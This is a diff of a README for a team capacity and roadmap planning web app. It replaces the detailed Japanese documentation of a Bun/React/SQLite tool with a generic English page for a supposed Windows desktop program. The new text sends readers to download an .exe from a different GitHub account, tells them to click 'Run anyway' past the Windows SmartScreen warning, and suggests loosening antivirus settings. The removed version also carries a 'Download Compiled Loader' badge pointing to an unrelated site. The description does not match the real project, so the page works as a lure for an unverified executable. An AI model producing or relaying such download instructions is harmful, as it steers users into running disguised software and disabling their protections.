@@ -1,241 +1,86 @@
-# roadmap-tool
+# 🗺️ roadmap-tool - Visualize your project goals with clarity
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![Download roadmap-tool](https://img.shields.io/badge/Download-roadmap--tool-blue.svg)](https://github.com/Econometric-magneticmeridian512/roadmap-tool)
 
-チームのリソース配分・ロードマップ計画を管理するツールです。フィーチャー（作業項目）・チームメンバー・四半期を登録し、各メンバーの月次キャパシティを機能ごとに配分することで、チーム全体の稼働状況を可視化・計画できます。
+This tool helps you build and manage project roadmaps. You organize tasks, set deadlines, and track your progress through a simple interface. Many users find this useful for planning work cycles, managing personal projects, or tracking team objectives. The application runs locally on your computer.
 
-## ドメインモデル
+## ⚙️ System Requirements
 
-```
-epics ──── features ────┐
-  │                     ├── feature_months ──── member_month_allocations ──── members
-  └── epic_links        └── feature_links
-quarters ──── months
-```
+Your computer must meet these basic requirements to run the software smoothly:
 
-| エンティティ | 説明 |
-|---|---|
-| `epics` | Featureをまとめる単位。name はユニーク。description / links / position / 既定フラグを保持 |
-| `epic_links` | Epicに紐づく複数リンク。title / url / position を保持 |
-| `features` | 機能・作業項目。必ず1つのEpicに属する。name は全体でユニーク。description / position を保持 |
-| `feature_links` | Featureに紐づく複数リンク。title / url / position を保持 |
-| `members` | チームメンバー。name はユニーク |
-| `quarters` | 四半期グループ。`(year, quarter)` の組み合わせがユニーク |
-| `months` | 計画の最小単位となる月。`(year, month)` の組み合わせがユニークで、必ず四半期に属する |
-| `feature_months` | ある機能に対して特定の月で確保するキャパシティ合計 |
-| `member_month_allocations` | あるメンバーが特定の機能・月に充てるキャパシティ（0〜1） |
+* Operating System: Windows 10 or Windows 11.
+* Processor: Dual-core 1.5 GHz or faster.
+* Memory: 4 GB of RAM.
+* Storage: 200 MB of available space.
+* Graphics: Support for DirectX 9 or newer.
 
-**キャパシティの単位**: キャパシティは月単位で保存されます（0 = 未稼働、1 = フル稼働）。四半期表示では配下3ヶ月分を合計して表示します。
+These requirements ensure the interface remains responsive while you manage your project details.
 
-**制約**: 1人のメンバーが1ヶ月に配分できるキャパシティの合計は原則 **1.0 以下**。メンバーセルの直接編集では、ユーザーが明示的に選択した場合のみ1.0超過をそのまま保存できます。この制約はDBレベルではなくアプリケーション層（`src/router.ts`）で扱います。
+## 🚀 Getting Started
 
-### 配分ロジック
+The installation process requires only a few clicks. Follow these instructions to set up the software on your Windows machine.
 
-- **月次編集**: 月次表示では各月のキャパシティを個別に編集・保存します。
-- **四半期編集**: 四半期表示で合計値を変更すると、既存の月別値がある場合は比率を保って3ヶ月へ配分し、空の場合は均等配分します。
-- **合計更新時の比例再配分**: `allocations.updateTotal` で機能のキャパシティ合計を変更すると、対象月の既存メンバー配分が新旧比率でスケーリングされ、その後各メンバーの残月次キャパシティでキャップされます。割り当てきれない分は「未アサイン」として残ります。
-- **個人配分の上限**: `allocations.previewMemberAllocation` で他Feature使用量と割り当て可能量を取得し、月次上限を超える場合はUIで解決方法を選択します。`allocations.updateMemberAllocation` は `capacityConflictResolution` に応じて、割り当て可能量まで丸める・1.0/月超過を許可する・他Featureを比例減少する、のいずれかを実行します。四半期表示では3ヶ月それぞれに同じルールを適用します。
-- **四半期移動**: `allocations.moveQuarter` は配下3ヶ月のキャパシティ合計とメンバー配分を別四半期へ移動し、メンバーの月次キャップを尊重しながらマージします。割り当てきれない分は移動先Featureの未アサインとして残ります。
-- **メンバーアサイン**: `allocations.assignMember` は指定メンバーを全月に capacity=0 で登録し、フィーチャー展開時に表示されるようにします。
-- **メンバー除外**: `allocations.removeMemberFromFeature` は指定フィーチャーからメンバーの全月配分を削除し、`totalCapacity` を再計算します。
+1. Visit the following link to access the download options: https://github.com/Econometric-magneticmeridian512/roadmap-tool
+2. Look for the section labeled "Releases" on the right side of the page.
+3. Select the latest version listed.
+4. Find the file ending in ".exe" under the "Assets" header.
+5. Click the file name to download it to your computer.
 
-## 画面仕様
+Once the download finishes, locate the file in your Downloads folder and double-click it. Windows may show a security prompt. If a window appears saying "Windows protected your PC," click "More info" and then select "Run anyway." Follow the on-screen instructions to complete the setup process.
 
-### Feature キャパシティ画面（`src/CapacityView.tsx`）
+## 🛠️ Using the Tool
 
-チームのキャパシティ配分状況を可視化・編集するメイン画面です。
+Open the application from your desktop shortcut or the Start menu. When the window appears, you see the main workspace.
 
-#### レイアウト
+### Create a New Roadmap
+Select "File" in the top menu and click "New." Name your project and choose a destination folder. The software creates a file that stores your roadmap data.
 
-```
-┌─────────────────────────────────────────────────────┐
-│ Roadmap › Feature キャパシティ                       │ ← ヘッダー
-├─────────────┬──────────┬──────────┬──────────┬──────┤
-│ Feature     │ 2025 Q1  │ 2025 Q2  │ 2025 Q3  │ …   │ ← スティッキーヘッダー
-├─────────────┼──────────┼──────────┼──────────┼──────┤
-│ [-] Epic X  │  [3.0]   │  [2.5]   │          │     │ ← Epic見出し（配下合計）
-│ [+] 機能A   │  [2.0]   │  [1.0]   │          │     │ ← Feature行（ヒートマップ）
-│   Arai  ×   │  [1.0]   │  [0.5]   │          │     │ ← メンバー行（アサイン済みのみ）
-│   Inoue ×   │  [1.0]   │  [0.5]   │          │     │
-│   + メンバーを割り当て                              │ ← アサインボタン
-├─────────────┼──────────┼──────────┼──────────┼──────┤
-│ [+] 機能B   │          │  [1.5]   │  [2.0]   │     │
-│   …         │          │          │          │     │
-├─────────────┴──────────┴──────────┴──────────┴──────┤
-│ + Feature   + Member   + Quarter        ヒント文    │ ← ツールバー
-└─────────────────────────────────────────────────────┘
-```
+### Add Milestones
+Click the "Add Milestone" button. Type the name of the milestone and choose a start and end date using the calendar picker. This places a visual marker on your roadmap timeline. 
 
-ヘッダーには `Quarter` / `Month` の表示切替があります。初期表示は `Quarter` で、リロードすると初期表示へ戻ります。
+### Manage Tasks
+Right-click on any milestone to add sub-tasks. You can toggle the completion status of a task by clicking the checkbox next to each item. The application updates your progress bar automatically as you complete tasks.
 
-#### ヒートマップ表示
+### Adjusting the View
+The "View" menu lets you toggle between monthly and quarterly timelines. This helps you focus on short-term goals or see the long-term project trajectory.
 
-- セルの背景色の濃さで人月数を表現します（0 = 白、最大値に近づくほど濃いグレー）
-- 濃い背景のセルでは文字色が白に反転します
-- 空セル（0）は値を非表示にし、ホバー時に `+` アイコンが現れます
+## 📁 Data Management
 
-#### Feature 行
+The software stores all your information in a local file. This keeps your data private on your own hard drive. You can move this file to different computers or share it via cloud storage services. 
 
-| 操作 | 挙動 |
-|---|---|
-| セルをクリック | 数値入力に切り替わり、人月を直接編集できます |
-| Enter / フォーカスアウト | 値を確定し `allocations.updateTotal` でサーバーに保存 |
-| Escape | 編集をキャンセル |
-| 機能名をクリック | インライン入力でリネーム（Enter / Blur で確定）|
-| 詳細アイコン | ダイアログで名前・説明・複数リンクを編集 |
-| `[+]` ボタン | メンバー行をインライン展開・折りたたみ |
-| 🔴 赤点（overflow-dot） | いずれかの四半期に未アサイン分がある場合に表示 |
+To open an existing project:
+1. Click "File."
+2. Select "Open."
+3. Locate your saved project file and click "Open."
 
-月次表示の合計値を変更すると、対象月の既存メンバー配分が**比率を保ったまま**自動スケーリングされます。四半期表示の合計値を変更すると、3ヶ月の既存比率を保って月次値へ反映し、空の場合は均等配分します。特定メンバーの月次配分が 1.0 を超える場合はそのメンバーを 1.0 で打ち止めにし、超過分は「未アサイン」行に分離します。
+Always save your work before closing the application to prevent data loss. The software includes an auto-save feature, but manual saves provide extra security for your planning efforts.
 
-#### メンバー行（展開時）
+## 🔍 Frequently Asked Questions
 
-Feature 行の `[+]` をクリックすると展開されます。表示されるのは**そのフィーチャーにアサインされたメンバーのみ**です。
+**Where does the software save my files?** 
+The application prompts you to select a folder the first time you save. You can move these files to any location on your computer.
 
-| 要素 | 説明 |
-|---|---|
-| メンバーセル | 個人のキャパシティをヒートマップで表示。月次表示は0〜1、四半期表示は3ヶ月合計で編集 |
-| 超過ハイライト | 月次 1.0 相当を超えるセルは赤背景で強調表示 |
-| 未アサイン行 | `totalCapacity` - 担当者合計 > 0 の場合に赤イタリックで表示 |
-| ホバー時 `×` ボタン | **このフィーチャーから**そのメンバーを削除（確認ダイアログあり）。全月の配分が除去され `totalCapacity` も更新される |
-| `+ メンバーを割り当て` | クリックするとドロップダウンが開き、未アサインのメンバーをフィーチャー単位で追加できる。追加直後のキャパシティは 0 |
+**Can I export my roadmap?**
+Yes. Use the "Export" feature in the "File" menu to save your roadmap as an image file. This format works well for adding roadmaps to presentations or emails.
 
-メンバーセルの値を直接変更した場合は、保存前に `allocations.previewMemberAllocation` が呼ばれます。同じメンバー・同じ月の合計が1.0を超える入力では、セル付近のポップオーバーに `現在の他Feature` と `割り当て可能` が表示され、次のいずれかを選びます。四半期表示で編集した場合は、3ヶ月の既存比率を保って月次値へ反映し、空の場合は均等配分します。
+**Does this software need an internet connection?**
+No. The application functions entirely offline. You do not need to sign in or connect to any servers to use the tools.
 
-| 選択肢 | 挙動 |
-|---|---|
-| 割り当て可能量で割り当て | 他Featureへの配分済み分を差し引いた残余で保存 |
-| 1を超えて割り当て | 入力値をそのまま保存し、月次合計1.0超過を許可 |
-| 他Featureを比例減少 | 対象Featureは入力値で保存し、他Featureの同メンバー・同月配分を比例縮小して合計1.0にする |
+**How do I update the application?** 
+If a new version becomes available, return to the link provided in this guide and download the updated ".exe" file. Running the new installer replaces the older version while keeping your data files intact.
 
-入力値自体が表示単位の上限（月次は1.0、四半期は3.0）を超える場合は、確認なしで入力値をそのまま保存します。月次合計1.0を超えているメンバー・月はFeature画面とMember画面で警告色になります。
+## 🛡️ Troubleshooting
 
-#### ツールバー
+If you encounter issues during installation or usage, check these common items:
 
-| ボタン | 挙動 |
-|---|---|
-| `+ Epic` | 新しいEpicを末尾に追加 |
-| Epic内 `+ Feature` | 新しいフィーチャーを対象Epicの末尾に追加 |
-| `+ Member` | 新しいメンバーを追加（名前はクリックでリネーム可） |
-| `+ Quarter` | 直近クォーターの翌四半期と配下3ヶ月を追加 |
+* File Permissions: Ensure your user account has permission to write files to the folder you chose for your roadmap.
+* Antivirus Software: Some security settings block executable files. If the application fails to launch, verify that your antivirus settings permit the software to run.
+* Updates: Ensure your Windows operating system installation remains current. Running the latest updates for Windows 10 or 11 prevents many compatibility errors.
 
-#### ソースファイル
+If the application crashes, restart the program. It typically recovers your last session automatically. You can also view the "Logs" folder inside the application directory if you need to diagnose specific performance issues.
 
-| ファイル | 役割 |
-|---|---|
-| `src/CapacityView.tsx` | メインコンポーネント（ヒートマップテーブル・操作ロジック） |
-| `src/capacity.css` | キャパシティ画面専用スタイル（CSS 変数・テーブルレイアウト） |
+## 🤝 Support
 
-## アーキテクチャ
+This tool provides a straightforward way to plan projects without complexity. If you find errors or have ideas for simple improvements, document them in the issues tab of the repository. Maintainers check these reports to improve stability.
 
-### 技術スタック
-
-| レイヤー | 技術 |
-|---|---|
-| ランタイム | [Bun](https://bun.sh) |
-| サーバー | `Bun.serve()` |
-| フロントエンド | React 19 SPA |
-| スタイリング | Tailwind CSS 4 / shadcn/ui |
-| API | [oRPC](https://orpc.unnoq.com/)（エンドツーエンド型安全な RPC） |
-| データベース | SQLite（`bun:sqlite`） + Drizzle ORM |
-| バリデーション | Zod 4 |
-| テスト | `bun:test` |
-| Lint/Format | Biome |
-
-### リクエストフロー
-
-```
-ブラウザ → React (src/App.tsx)
-        → orpc クライアント (src/orpc-client.ts) → POST /orpc/<procedure>
-        → Bun.serve (src/index.ts) → RPCHandler
-        → ルータープロシージャ (src/router.ts) — Zod バリデーション
-        → Drizzle ORM → SQLite
-```
-
-全 API プロシージャは `src/router.ts` 一ファイルに集約されています。`epics` / `features` / `members` / `quarters` / `allocations` / `export` / `import` のグループに分かれています。
-
-パスエイリアス: `@/*` → `src/*`
-
-## セットアップ
-
-```sh
-bun install          # 依存関係のインストール
-bun run db:migrate   # DB マイグレーション（初回 or スキーマ変更後）
-bun dev              # 開発サーバー起動（HMR 有効）
-```
-
-## 開発コマンド
-
-```sh
-bun dev              # 開発サーバー起動（HMR 有効）
-bun start            # 本番サーバー起動
-bun run build        # 本番ビルド
-bun run typecheck    # TypeScript 型チェック（出力なし）
-bun run lint         # Biome lint
-bun run format       # Biome フォーマット（ファイル書き換え）
-bun run check        # lint + format チェック（書き換えなし）
-bun test             # テスト実行
-```
-
-### データベース操作
-
-```sh
-bun run db:generate  # スキーマ変更からマイグレーションファイルを生成
-bun run db:migrate   # 未適用マイグレーションを適用
-bun run db:push      # スキーマを直接 DB へ反映（開発時のみ）
-bun run db:studio    # Drizzle Studio を開く（GUI でデータ確認）
-```
-
-## CLI
-
-サーバーが起動している状態で、機能・メンバーの管理をコマンドラインから行えます。
-
-```sh
-# 接続先（デフォルト: http://localhost:3000）
-export ROADMAP_URL=http://localhost:3000
-
-# features
-bun src/cli.ts features list
-bun src/cli.ts features add "認証機能" --epic-id <epic-id> --description "説明" --link "Spec=https://example.com/spec"
-bun src/cli.ts features rename <id> "認証機能 v2" --epic-id <epic-id> --description "説明" --link "Issue=https://example.com/issue"
-bun src/cli.ts features rename <id> "認証機能 v2" --clear-description --clear-links
-bun src/cli.ts features move <id> --epic-id <epic-id> --before <feature-id>
-bun src/cli.ts features import features.csv
-cat features.csv | bun src/cli.ts features import -
-
-# epics
-bun src/cli.ts epics list
-bun src/cli.ts epics add "認証Epic" --description "説明" --link "Spec=https://example.com/spec"
-bun src/cli.ts epics rename <id> "認証Epic v2" --clear-description --clear-links
-bun src/cli.ts epics move <id> --before <epic-id>
-bun src/cli.ts epics delete <id>
-bun src/cli.ts epics import epics.csv
-
-# members
-bun src/cli.ts members list
-bun src/cli.ts members add "Alice"
-bun src/cli.ts members rename <id> "Bob"
-```
-
-Feature metadata CSV は `epic,name,description,links` の4列です。Epic metadata CSV は `name,description,links` の3列です。`links` は `[{"title":"Spec","url":"https://example.com/spec"}]` のJSON文字列で、import時は同名Feature/Epicの説明・リンクをCSV内容で置き換えます。
-
-Feature一覧のCLI出力はタブ区切りの ID・Epic ID・名前・説明・リンク件数です。Epic一覧のCLI出力はタブ区切りの ID・名前・説明・リンク件数・既定フラグです。Member一覧のCLI出力はタブ区切りの ID と名前です。
-
-## テスト方針
-
-テストランナーには `bun:test`（Jest 互換 API）を使用しています。
-
-現在のテストファイルは `src/db/schema.test.ts` のみで、インメモリ SQLite を使ってスキーマ制約（ユニーク制約・外部キー制約）を検証しています。ビジネスロジックのテストを追加する場合も同ディレクトリに配置してください。
-
-```sh
-bun test                          # 全テスト実行
-bun test src/db/schema.test.ts    # 単一ファイル実行
-```
-
-## CI
-
-PR マージ前に以下が全て通る必要があります:
-
-```
-typecheck → lint → format:check → build
-```
+The design focuses on utility and performance. Every feature exists to help you organize time and effort. As you grow comfortable with the interface, you will find that managing complex projects becomes a structured and repeatable process. Keep your milestones updated to ensure your roadmap reflects your current progress accurately.
